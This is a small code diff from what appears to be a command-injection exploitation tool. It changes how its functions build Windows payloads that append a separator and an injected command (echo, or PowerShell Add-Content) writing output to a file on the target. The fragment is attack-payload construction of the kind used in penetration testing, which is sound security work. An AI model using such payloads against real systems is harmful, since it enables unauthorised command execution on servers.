@@ -29,7 +29,8 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
 
   if settings.TARGET_OS == "win":
     payload = (separator + " " +
-              "echo " + TAG + " > " + OUTPUT_TEXTFILE 
+              "powershell.exe Add-Content " +
+              OUTPUT_TEXTFILE + " " + TAG
               ) 
   else:
     payload = (separator + " " +
@@ -73,7 +74,7 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
     payload = (separator + cmd)
 
   elif settings.TARGET_OS == "win":
-    payload = (separator +
+    payload = (separator + " " +
               cmd + " > " + OUTPUT_TEXTFILE
               ) 
   else:
